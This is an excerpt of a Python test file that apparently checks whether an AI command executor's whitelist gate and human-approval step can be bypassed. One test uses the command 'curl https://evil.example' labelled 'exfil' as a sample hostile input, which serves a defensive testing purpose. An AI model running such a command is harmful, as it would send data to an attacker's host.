...
class TestExecuteCommandTargetSystems:
    ...
    async def test_whitelist_alone_does_not_skip_human_approval(self):
        ...
        g8e_context = self._make_g8e_context()
        args = ExecutorCommandArgs(
            command="uptime", request="health check", target_operators=["all"]
        )
    ...
    async def test_auto_approve_does_not_bypass_whitelist_hard_gate(self):
        ...
        args = ExecutorCommandArgs(
            command="curl https://evil.example", request="exfil", target_operators=["all"]
        )
